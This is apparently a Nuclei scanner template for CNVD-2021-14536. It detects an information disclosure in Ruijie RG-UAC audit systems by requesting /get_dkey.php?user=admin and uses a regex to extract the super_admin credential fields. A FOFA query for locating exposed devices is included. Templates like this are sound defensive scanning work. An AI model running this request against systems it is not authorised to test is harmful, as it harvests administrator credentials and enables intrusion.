id: CNVD-2021-14536
info:
  name: Ruijie RG-UAC Unified Internet Behavior Management Audit System - Information
    Disclosure
  author: daffainfo
  severity: high
  description: Ruijie RG-UAC Unified Internet Behavior Management Audit System is
    vulnerable to information disclosure, allowing attackers to access and potentially
    leak administrator user authentication information.
  reference:
  - https://www.adminxe.com/2163.html
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
  metadata:
    fofa-query: "title=\"RG-UAC\u767B\u5F55\u9875\u9762\""
    impact: The impact of CNVD-2021-14536 on Ruijie RG-UAC Unified Internet Behavior
      Management Audit System is the risk of administrator user authentication information
      leakage due to attackers obtaining user accounts and passwords through reviewing
      the source code of web pages.
    recommendation: It is highly recommended to patch the vulnerability CNVD-2021-14536
      in Ruijie RG-UAC Unified Internet Behavior Management Audit System promptly
      to prevent potential exploitation of the information disclosure vulnerability.
  tags: ruijie,cnvd,cnvd2021,disclosure
requests:
- method: GET
  path:
  - '{{BaseURL}}/get_dkey.php?user=admin'
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - '"pre_define"'
    - '"auth_method"'
    - '"name"'
    - '"password"'
    condition: and
  - type: status
    status:
    - 200
  extractors:
  - type: regex
    part: body
    group: 1
    regex:
    - '"role":"super_admin",(["a-z:,0-9]+),"lastpwdtime":'
